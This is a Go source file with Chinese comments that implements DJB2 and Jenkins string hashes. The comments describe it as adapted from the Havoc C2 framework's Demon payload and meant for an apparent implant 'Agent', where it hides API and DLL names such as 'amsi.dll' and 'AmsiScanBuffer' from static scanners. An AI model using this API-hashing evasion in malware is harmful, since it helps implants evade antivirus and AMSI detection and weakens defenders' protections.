// Package hash 提供 API 哈希函数，用于避免敏感字符串明文。
// 借鉴 Havoc payload/Demon/include/common/Defines.h 的 DJB2 哈希（key=5381）。
//
// 用途：在 Agent 中对 API 名称、DLL 名称、敏感字符串进行哈希，
// 避免静态扫描直接匹配到 "amsi.dll"、"AmsiScanBuffer" 等特征。
package hash

// DJB2 计算字符串的 DJB2 哈希。
// Havoc 使用 key=5381，这是经典 DJB2 算法的种子值。
func DJB2(s string) uint32 {
	var hash uint32 = 5381
	for i := 0; i < len(s); i++ {
		hash = ((hash << 5) + hash) + uint32(s[i])
	}
	return hash
}

// JenkinsHash 计算字符串的 Jenkins one-at-a-time 哈希。
// 相比 DJB2 有更好的 avalanche 特性，碰撞率更低。
func JenkinsHash(s string) uint32 {
	var hash uint32
	for i := 0; i < len(s); i++ {
		hash += uint32(s[i])
		hash += hash << 10
		hash ^= hash >> 6
	}
	hash += hash << 3
	hash ^= hash >> 11
	hash += hash << 15
	return hash
}

// DJB2Lower 计算字符串小写形式的 DJB2 哈希。
// 用于大小写不敏感的场景（如 DLL 名称匹配）。
func DJB2Lower(s string) uint32 {
	var hash uint32 = 5381
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c >= 'A' && c <= 'Z' {
			c += 'a' - 'A'
		}
		hash = ((hash << 5) + hash) + uint32(c)
	}
	return hash
}

// JenkinsHashLower 计算字符串小写形式的 Jenkins 哈希。
func JenkinsHashLower(s string) uint32 {
	var hash uint32
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c >= 'A' && c <= 'Z' {
			c += 'a' - 'A'
		}
		hash += uint32(c)
		hash += hash << 10
		hash ^= hash >> 6
	}
	hash += hash << 3
	hash ^= hash >> 11
	hash += hash << 15
	return hash
}
